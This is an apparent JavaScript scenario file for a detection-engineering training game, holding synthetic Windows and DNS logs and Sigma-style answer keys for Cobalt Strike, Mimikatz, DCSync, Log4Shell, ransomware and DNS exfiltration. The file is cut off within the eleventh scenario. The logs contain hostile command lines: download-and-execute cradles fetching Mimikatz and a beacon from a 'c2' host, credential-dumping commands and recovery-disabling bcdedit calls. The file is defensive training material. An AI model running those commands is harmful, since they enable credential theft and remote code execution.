/**
 * Level 3: Advanced Scenarios (16 scenarios)
 * Focus: Multi-stage attacks, correlation, complex regex, APT simulation
 * Difficulty: 3-5 (Hard to Expert)
 */

export const LEVEL_3_SCENARIOS = [
  // Scenario 1: Cobalt Strike Beacon Detection
  {
    id: 'L3-001',
    title: 'Cobalt Strike Beacon',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Command and Control',
      tacticId: 'TA0011',
      technique: 'T1071.001',
      techniqueName: 'Application Layer Protocol: Web Protocols',
      url: 'https://attack.mitre.org/techniques/T1071/001/'
    },
    realWorldReference: {
      incidents: ['APT29', 'FIN7', 'Conti', 'Most ransomware groups'],
      description: 'Cobalt Strike is the most commonly used C2 framework. Detection focuses on its distinctive spawning patterns and named pipes.',
      year: '2012-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-001</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold animate-pulse">CRITICAL - APT ACTIVITY</span></p>
        </div>
        <p><strong>Intelligence:</strong> Cobalt Strike beacon activity detected. Multiple indicators suggest active C2 communication.</p>
        <p><strong>Objective:</strong> Detect Cobalt Strike patterns: rundll32 spawning with no arguments, or suspicious named pipe patterns.</p>
        <p><strong>Advanced:</strong> Use regex to match Cobalt Strike's default named pipe pattern.</p>
      </div>
    `,
    logs: [
      {
        id: 30001,
        timestamp: 'Dec 05 09:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe shell32.dll,Control_RunDLL',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 30002,
        timestamp: 'Dec 05 09:05:00',
        host: 'WORKSTATION-50',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe',
        parentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        user: 'CORP\\victim',
        namedPipe: '\\\\.\\pipe\\MSSE-1234-server',
        malicious: true
      },
      {
        id: 30003,
        timestamp: 'Dec 05 09:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe printui.dll,PrintUIEntry /in /n\\\\server\\printer',
        parentImage: 'C:\\Windows\\System32\\cmd.exe',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30004,
        timestamp: 'Dec 05 09:15:00',
        host: 'SERVER-WEB',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe',
        parentImage: 'C:\\inetpub\\wwwroot\\upload\\shell.aspx',
        user: 'IIS APPPOOL\\DefaultAppPool',
        namedPipe: '\\\\.\\pipe\\msagent_12',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'Cobalt Strike often spawns rundll32.exe with no arguments' },
      { cost: 100, content: 'Check for rundll32.exe where CommandLine equals just "rundll32.exe"' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'rundll32.exe\'\\n    CommandLine|endswith: \'rundll32.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30002, 30004],
    starterCode: `# Detect Cobalt Strike beacon indicators

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 2: Mimikatz Detection
  {
    id: 'L3-002',
    title: 'Mimikatz in Action',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1003',
      techniqueName: 'OS Credential Dumping',
      url: 'https://attack.mitre.org/techniques/T1003/'
    },
    realWorldReference: {
      incidents: ['Every major breach', 'APT groups', 'Ransomware'],
      description: 'Mimikatz is the most widely used credential theft tool. Detection requires matching multiple command patterns.',
      year: '2012-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-002</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - CREDENTIAL THEFT</span></p>
        </div>
        <p><strong>Intelligence:</strong> Mimikatz execution detected. Attackers are harvesting credentials from memory.</p>
        <p><strong>Objective:</strong> Detect Mimikatz command patterns like sekurlsa::logonpasswords, lsadump::, or privilege::debug.</p>
        <p><strong>Challenge:</strong> Match multiple Mimikatz modules using regex.</p>
      </div>
    `,
    logs: [
      {
        id: 30201,
        timestamp: 'Dec 06 10:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c systeminfo',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30202,
        timestamp: 'Dec 06 10:05:00',
        host: 'DC01',
        severity: 'CRIT',
        image: 'C:\\temp\\m.exe',
        commandLine: 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 30203,
        timestamp: 'Dec 06 10:10:00',
        host: 'WORKSTATION-55',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe IEX (New-Object Net.WebClient).DownloadString(\'http://c2/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -Command "lsadump::dcsync"',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 30204,
        timestamp: 'Dec 06 10:15:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Credential',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for Mimikatz module patterns: sekurlsa::, lsadump::, privilege::' },
      { cost: 100, content: 'Use regex to match patterns like sekurlsa:: or lsadump::' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|re: \'(sekurlsa|lsadump|kerberos|privilege)::\\w+\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30202, 30203],
    starterCode: `# Detect Mimikatz execution patterns

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 3: DCSync Attack
  {
    id: 'L3-003',
    title: 'DCSync Attack',
    level: 3,
    difficulty: 5,
    logSource: 'authentication',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1003.006',
      techniqueName: 'OS Credential Dumping: DCSync',
      url: 'https://attack.mitre.org/techniques/T1003/006/'
    },
    realWorldReference: {
      incidents: ['APT29', 'NotPetya', 'Major AD compromises'],
      description: 'DCSync abuses replication rights to extract password hashes from domain controllers. Detected via replication events from non-DC sources.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-003</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold animate-pulse">CRITICAL - DOMAIN COMPROMISE</span></p>
        </div>
        <p><strong>Intelligence:</strong> DCSync attack detected! An attacker is replicating AD credentials using domain replication protocols.</p>
        <p><strong>Objective:</strong> Detect directory service replication requests from non-domain-controller IPs.</p>
        <p><strong>Note:</strong> Legitimate replication only occurs between domain controllers.</p>
      </div>
    `,
    logs: [
      {
        id: 30301,
        timestamp: 'Dec 07 11:00:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4662',
        targetUser: 'DC02$',
        sourceIP: '192.168.1.11',
        objectType: 'domainDNS',
        accessMask: '0x100',
        properties: 'Replicating Directory Changes',
        malicious: false
      },
      {
        id: 30302,
        timestamp: 'Dec 07 11:05:00',
        host: 'DC01',
        severity: 'CRIT',
        logSource: 'authentication',
        eventId: '4662',
        targetUser: 'attacker',
        sourceIP: '192.168.1.55',
        objectType: 'domainDNS',
        accessMask: '0x100',
        properties: 'Replicating Directory Changes All',
        malicious: true
      },
      {
        id: 30303,
        timestamp: 'Dec 07 11:10:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4624',
        targetUser: 'admin',
        sourceIP: '192.168.1.100',
        logonType: '3',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'DCSync shows "Replicating Directory Changes" in event properties' },
      { cost: 100, content: 'Filter on Properties containing "Replicating Directory Changes"' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Properties|contains: \'Replicating Directory Changes\'\\n  filter_dc:\\n    TargetUser|endswith: \'$\'\\n  condition: selection and not filter_dc', isSolution: true }
    ],
    expectedDetections: [30302],
    starterCode: `# Detect DCSync attacks

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 4: Golden Ticket Detection
  {
    id: 'L3-004',
    title: 'Golden Ticket Attack',
    level: 3,
    difficulty: 5,
    logSource: 'authentication',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1558.001',
      techniqueName: 'Steal or Forge Kerberos Tickets: Golden Ticket',
      url: 'https://attack.mitre.org/techniques/T1558/001/'
    },
    realWorldReference: {
      incidents: ['APT29', 'NotPetya', 'Operation Wocao'],
      description: 'Golden Tickets are forged Kerberos TGTs. Detection relies on anomalies like TGT usage without prior AS request.',
      year: '2014-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-yellow-500 pl-4">
          <h3 class="font-bold text-yellow-400">Incident Report #L3-004</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - PERSISTENT ACCESS</span></p>
        </div>
        <p><strong>Intelligence:</strong> Potential Golden Ticket usage detected. Kerberos ticket anomalies indicate forged tickets.</p>
        <p><strong>Objective:</strong> Detect Golden Ticket indicators: TGS requests with unusual ticket lifetimes or encryption types.</p>
      </div>
    `,
    logs: [
      {
        id: 30401,
        timestamp: 'Dec 08 12:00:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4768',
        targetUser: 'admin',
        sourceIP: '192.168.1.100',
        ticketOptions: '0x40810010',
        ticketLifetime: '10h',
        malicious: false
      },
      {
        id: 30402,
        timestamp: 'Dec 08 12:05:00',
        host: 'DC01',
        severity: 'CRIT',
        logSource: 'authentication',
        eventId: '4769',
        targetUser: 'krbtgt',
        sourceIP: '192.168.1.55',
        ticketOptions: '0x40810010',
        ticketLifetime: '87600h',
        serviceName: 'cifs/dc01.corp.local',
        malicious: true
      },
      {
        id: 30403,
        timestamp: 'Dec 08 12:10:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4769',
        targetUser: 'HTTP/webserver',
        sourceIP: '192.168.1.50',
        ticketOptions: '0x40810010',
        ticketLifetime: '10h',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Golden Tickets often have extremely long lifetimes (years)' },
      { cost: 100, content: 'Look for ticket lifetimes over 100h or unusual values' },
      { cost: 200, content: 'detection:\\n  selection:\\n    TicketLifetime|re: \'^[0-9]{4,}h$\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30402],
    starterCode: `# Detect Golden Ticket attacks

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 5: ProxyShell/Exchange Attack
  {
    id: 'L3-005',
    title: 'Exchange ProxyShell',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Initial Access',
      tacticId: 'TA0001',
      technique: 'T1190',
      techniqueName: 'Exploit Public-Facing Application',
      url: 'https://attack.mitre.org/techniques/T1190/'
    },
    realWorldReference: {
      incidents: ['ProxyShell CVE-2021-34473', 'Hafnium', 'Multiple APTs'],
      description: 'Exchange ProxyShell exploitation leads to web shells and subsequent command execution from IIS worker processes.',
      year: '2021'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L3-005</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - ACTIVE EXPLOITATION</span></p>
        </div>
        <p><strong>Intelligence:</strong> Exchange server compromise detected. Web shells being executed via IIS/w3wp.exe.</p>
        <p><strong>Objective:</strong> Detect command execution spawned by IIS worker processes (w3wp.exe) - indicates web shell.</p>
      </div>
    `,
    logs: [
      {
        id: 30501,
        timestamp: 'Dec 09 13:00:00',
        host: 'EXCHANGE-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
        commandLine: 'w3wp.exe -ap "MSExchangeServicesAppPool"',
        parentImage: 'C:\\Windows\\System32\\svchost.exe',
        user: 'IIS APPPOOL\\MSExchangeServicesAppPool',
        malicious: false
      },
      {
        id: 30502,
        timestamp: 'Dec 09 13:05:00',
        host: 'EXCHANGE-01',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c whoami & hostname & ipconfig',
        parentImage: 'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 30503,
        timestamp: 'Dec 09 13:10:00',
        host: 'WEB-SERVER',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c dir',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30504,
        timestamp: 'Dec 09 13:15:00',
        host: 'EXCHANGE-01',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -ep bypass -c "IEX (iwr http://c2/beacon)"',
        parentImage: 'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'w3wp.exe should not spawn cmd.exe or powershell.exe directly' },
      { cost: 100, content: 'Filter on ParentImage containing w3wp.exe with shell children' },
      { cost: 200, content: 'detection:\\n  selection:\\n    ParentImage|endswith: \'w3wp.exe\'\\n    Image|endswith:\\n      - \'cmd.exe\'\\n      - \'powershell.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30502, 30504],
    starterCode: `# Detect web shell execution via IIS

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 6: Log4Shell Exploitation
  {
    id: 'L3-006',
    title: 'Log4Shell Attack',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Initial Access',
      tacticId: 'TA0001',
      technique: 'T1190',
      techniqueName: 'Exploit Public-Facing Application',
      url: 'https://attack.mitre.org/techniques/T1190/'
    },
    realWorldReference: {
      incidents: ['Log4Shell CVE-2021-44228', 'Multiple APT groups'],
      description: 'Log4Shell allows RCE via JNDI injection. Java processes spawning shells indicates successful exploitation.',
      year: '2021'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-006</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold animate-pulse">CRITICAL - LOG4SHELL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Log4Shell exploitation detected. Java applications spawning suspicious child processes.</p>
        <p><strong>Objective:</strong> Detect Java processes (java.exe, javaw.exe) spawning command shells or downloading tools.</p>
      </div>
    `,
    logs: [
      {
        id: 30601,
        timestamp: 'Dec 10 14:00:00',
        host: 'APP-SERVER',
        severity: 'INFO',
        image: 'C:\\Program Files\\Java\\jdk-11\\bin\\java.exe',
        commandLine: 'java.exe -jar application.jar',
        parentImage: 'C:\\Windows\\System32\\services.exe',
        user: 'CORP\\svc_app',
        malicious: false
      },
      {
        id: 30602,
        timestamp: 'Dec 10 14:05:00',
        host: 'APP-SERVER',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c powershell -ep bypass -e JABjAGwAaQBlAG4AdAA=',
        parentImage: 'C:\\Program Files\\Java\\jdk-11\\bin\\java.exe',
        user: 'CORP\\svc_app',
        malicious: true
      },
      {
        id: 30603,
        timestamp: 'Dec 10 14:10:00',
        host: 'DEV-SERVER',
        severity: 'INFO',
        image: 'C:\\Program Files\\Java\\jdk-11\\bin\\java.exe',
        commandLine: 'java.exe -version',
        parentImage: 'C:\\Windows\\System32\\cmd.exe',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Java processes spawning cmd or powershell is suspicious' },
      { cost: 100, content: 'Filter on ParentImage containing java with shell children' },
      { cost: 200, content: 'detection:\\n  selection:\\n    ParentImage|endswith:\\n      - \'java.exe\'\\n      - \'javaw.exe\'\\n    Image|endswith:\\n      - \'cmd.exe\'\\n      - \'powershell.exe\'\\n      - \'bash.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30602],
    starterCode: `# Detect Log4Shell exploitation

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 7: Ransomware Kill Chain
  {
    id: 'L3-007',
    title: 'Ransomware Deployment',
    level: 3,
    difficulty: 5,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Impact',
      tacticId: 'TA0040',
      technique: 'T1486',
      techniqueName: 'Data Encrypted for Impact',
      url: 'https://attack.mitre.org/techniques/T1486/'
    },
    realWorldReference: {
      incidents: ['Ryuk', 'Conti', 'REvil', 'LockBit'],
      description: 'Ransomware deployment involves multiple stages: disable defenses, delete backups, then encrypt. Detect the pattern.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-007</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold animate-pulse">CRITICAL - RANSOMWARE</span></p>
        </div>
        <p><strong>Intelligence:</strong> Ransomware deployment in progress! Multiple indicators of encryption preparation.</p>
        <p><strong>Objective:</strong> Detect bcdedit.exe being used to disable recovery options (common ransomware technique).</p>
      </div>
    `,
    logs: [
      {
        id: 30701,
        timestamp: 'Dec 11 15:00:00',
        host: 'FILE-SERVER',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\bcdedit.exe',
        commandLine: 'bcdedit /enum',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30702,
        timestamp: 'Dec 11 15:05:00',
        host: 'VICTIM-SERVER',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\bcdedit.exe',
        commandLine: 'bcdedit /set {default} recoveryenabled No',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 30703,
        timestamp: 'Dec 11 15:06:00',
        host: 'VICTIM-SERVER',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\bcdedit.exe',
        commandLine: 'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 30704,
        timestamp: 'Dec 11 15:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\bcdedit.exe',
        commandLine: 'bcdedit /set testsigning on',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Ransomware disables recovery with "recoveryenabled No" or "ignoreallfailures"' },
      { cost: 100, content: 'Filter bcdedit with recovery-disabling commands' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'bcdedit.exe\'\\n    CommandLine|contains:\\n      - \'recoveryenabled\'\\n      - \'ignoreallfailures\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30702, 30703],
    starterCode: `# Detect ransomware recovery disabling

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 8: BloodHound Collection
  {
    id: 'L3-008',
    title: 'BloodHound Reconnaissance',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Discovery',
      tacticId: 'TA0007',
      technique: 'T1087.002',
      techniqueName: 'Account Discovery: Domain Account',
      url: 'https://attack.mitre.org/techniques/T1087/002/'
    },
    realWorldReference: {
      incidents: ['Most AD attacks', 'APT groups', 'Pentest tools'],
      description: 'BloodHound/SharpHound collects AD information for attack path analysis. Detection focuses on its distinctive LDAP queries.',
      year: '2016-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L3-008</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> BloodHound/SharpHound AD enumeration detected. Attackers are mapping the domain.</p>
        <p><strong>Objective:</strong> Detect SharpHound execution patterns - typically runs as "SharpHound" or with collection methods.</p>
      </div>
    `,
    logs: [
      {
        id: 30801,
        timestamp: 'Dec 12 16:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\dsquery.exe',
        commandLine: 'dsquery user -limit 10',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30802,
        timestamp: 'Dec 12 16:05:00',
        host: 'WORKSTATION-60',
        severity: 'CRIT',
        image: 'C:\\Users\\attacker\\Downloads\\SharpHound.exe',
        commandLine: 'SharpHound.exe -c All --outputdirectory C:\\temp',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 30803,
        timestamp: 'Dec 12 16:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-ADUser -Filter *',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30804,
        timestamp: 'Dec 12 16:15:00',
        host: 'WORKSTATION-60',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://c2/SharpHound.ps1\'); Invoke-BloodHound -CollectionMethod All"',
        user: 'CORP\\attacker',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "SharpHound" or "BloodHound" or collection methods in commands' },
      { cost: 100, content: 'Filter on CommandLine or Image containing BloodHound/SharpHound' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|contains:\\n      - \'SharpHound\'\\n      - \'BloodHound\'\\n      - \'Invoke-BloodHound\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30802, 30804],
    starterCode: `# Detect BloodHound/SharpHound execution

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 9: Impacket Tools Detection
  {
    id: 'L3-009',
    title: 'Impacket Attack Tools',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Lateral Movement',
      tacticId: 'TA0008',
      technique: 'T1021.002',
      techniqueName: 'Remote Services: SMB/Windows Admin Shares',
      url: 'https://attack.mitre.org/techniques/T1021/002/'
    },
    realWorldReference: {
      incidents: ['APT groups', 'Pentesters', 'Ransomware operators'],
      description: 'Impacket tools (wmiexec, smbexec, atexec) create distinctive command patterns with cmd.exe /Q /c.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L3-009</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Impacket-style lateral movement detected. Remote command execution via SMB.</p>
        <p><strong>Objective:</strong> Detect Impacket's wmiexec/smbexec command pattern: cmd.exe /Q /c with output redirection.</p>
      </div>
    `,
    logs: [
      {
        id: 30901,
        timestamp: 'Dec 13 17:00:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c ipconfig',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 30902,
        timestamp: 'Dec 13 17:05:00',
        host: 'SERVER-DB',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1234567890.tmp 2>&1',
        parentImage: 'C:\\Windows\\System32\\services.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 30903,
        timestamp: 'Dec 13 17:10:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c echo test > output.txt',
        parentImage: 'C:\\Windows\\System32\\cmd.exe',
        user: 'CORP\\user1',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Impacket uses /Q /c and redirects to ADMIN$ or C$ shares' },
      { cost: 100, content: 'Filter on CommandLine containing /Q /c and ADMIN$ or \\\\127.0.0.1' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'cmd.exe\'\\n    CommandLine|contains|all:\\n      - \'/Q\'\\n      - \'/c\'\\n      - \'\\\\\\\\127.0.0.1\\\\\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [30902],
    starterCode: `# Detect Impacket tool execution

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 10: Data Exfiltration via DNS
  {
    id: 'L3-010',
    title: 'DNS Data Exfiltration',
    level: 3,
    difficulty: 5,
    logSource: 'dns',
    mitre: {
      tactic: 'Exfiltration',
      tacticId: 'TA0010',
      technique: 'T1048.003',
      techniqueName: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol',
      url: 'https://attack.mitre.org/techniques/T1048/003/'
    },
    realWorldReference: {
      incidents: ['APT34', 'OilRig', 'FrameworkPOS'],
      description: 'Data exfiltration via DNS uses long subdomain labels to encode stolen data. Detect unusually long DNS queries.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-010</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - DATA THEFT</span></p>
        </div>
        <p><strong>Intelligence:</strong> DNS exfiltration detected! Data being encoded in DNS subdomain queries.</p>
        <p><strong>Objective:</strong> Detect DNS queries with unusually long subdomain labels (Base64-encoded data).</p>
        <p><strong>Challenge:</strong> Use regex to match long encoded subdomains (30+ chars before first dot).</p>
      </div>
    `,
    logs: [
      {
        id: 31001,
        timestamp: 'Dec 14 09:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'chrome.exe',
        queryName: 'www.google.com',
        queryType: 'A',
        malicious: false
      },
      {
        id: 31002,
        timestamp: 'Dec 14 09:05:00',
        host: 'WORKSTATION-70',
        severity: 'CRIT',
        logSource: 'dns',
        processName: 'powershell.exe',
        queryName: 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.data.evil-exfil.com',
        queryType: 'TXT',
        malicious: true
      },
      {
        id: 31003,
        timestamp: 'Dec 14 09:10:00',
        host: 'MAIL-SERVER',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'msexchangetransport.exe',
        queryName: 'mail.contoso.com',
        queryType: 'MX',
        malicious: false
      },
      {
        id: 31004,
        timestamp: 'Dec 14 09:15:00',
        host: 'WORKSTATION-70',
        severity: 'CRIT',
        logSource: 'dns',
        processName: 'rundll32.exe',
        queryName: 'VGhpcyBpcyBzZW5zaXRpdmUgZGF0YSBiZWluZyBleGZpbHRyYXRlZA.c2.attacker.net',
        queryType: 'A',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'Look for DNS queries with very long first labels (encoded data)' },
      { cost: 100, content: 'Use regex to match queries where first subdomain is 30+ characters' },
      { cost: 200, content: 'detection:\\n  selection:\\n    QueryName|re: \'^[A-Za-z0-9+/=]{30,}\\.\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31002, 31004],
    starterCode: `# Detect DNS data exfiltration

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 11: Scheduled Task Persistence via COM
  {
    id: 'L3-011',
    title: 'COM Object Hijacking',
    level: 3,
    difficulty: 4,
    logSource: 'registry',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1546.015',
      techniqueName: 'Event Triggered Execution: Component Object Model Hijacking',
      url: 'https://attack.mitre.org/techniques/T1546/015/'
    },
    realWorldReference: {
      incidents: ['APT28', 'Turla', 'Sofacy'],
      description: 'COM hijacking abuses the Windows COM system by replacing legitimate COM objects with malicious ones.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L3-011</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> COM object hijacking detected. Malicious DLLs registered in user-writable CLSID paths.</p>
        <p><strong>Objective:</strong> Detect registry modifications to HKCU\\Software\\Classes\\CLSID that point to suspicious DLLs.</p>
      </div>
    `,
    logs: [
      {
        id: 31101,
        timestamp: 'Dec 15 10:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'registry',
        processName: 'regsvr32.exe',
        targetObject: 'HKLM\\SOFTWARE\\Classes\\CLSID\\{12345678-1234-1234-1234-123456789ABC}\\InProcServer32',
        eventType: 'SetValue',
        details: 'C:\\Windows\\System32\\legitimate.dll',
        malicious: false
      },
      {
